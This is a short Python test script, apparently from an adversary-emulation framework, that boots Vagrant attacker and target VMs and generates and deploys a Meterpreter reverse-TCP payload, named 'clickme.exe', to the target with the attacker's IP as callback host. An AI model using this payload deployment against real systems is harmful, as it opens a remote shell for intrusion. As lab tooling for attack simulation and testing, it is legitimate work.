from app.machinecontrol import Machine
from app.attack_log import AttackLog
from app.metasploit import MSFVenom, Metasploit


# For some local tests
if __name__ == "__main__":

    # msfrpcd -S -P password -u user -f
    # attacker_ip = "192.168.178.125"
    # target_ip = "192.168.178.125"

    # Metasploit RPC
    password = "password"
    user = "user"

    attack_logger = AttackLog(2)
    attacker = Machine({  # "root": "systems/attacker1",
                       "os": "linux",
                       "vm_controller": {
                           "type": "vagrant",
                           "vagrantfilepath": "systems",
                           # "ip": attacker_ip
                       },
                       "vm_name": "attacker",
                       "machinepath": "attacker1"}, attack_logger)
    attacker.up()

    # Target machine is attacker machine here
    target = Machine({  # "root": "systems/target3",
                     "os": "linux",
                     "vm_controller": {
                        "type": "vagrant",
                        "vagrantfilepath": "systems",
                        #  "ip": attacker_ip
                     },
                     "vm_name": "target3",
                     "machinepath": "target3"}, attack_logger)
    target.up()

    venom = MSFVenom(attacker, target, attack_logger)
    print(venom.generate_cmd(payload="linux/x64/meterpreter_reverse_tcp",
                             architecture="x64",
                             platform="linux",
                             # lhost,
                             format="elf",
                             outfile="clickme.exe"))
    venom.generate_and_deploy(payload="linux/x64/meterpreter_reverse_tcp",
                              architecture="x64",
                              platform="linux",
                              lhost=attacker.get_ip(),
                              format="elf",
                              outfile="clickme.exe")
    # start msfrpcd on attacker
    # TODO get meterpreter session
    # TODO simple command to test

    metasploit = Metasploit(password, attacker=attacker, username=user)
    # client = MsfRpcClient('yourpassword', ssl=True)


    target.halt()
    attacker.halt()
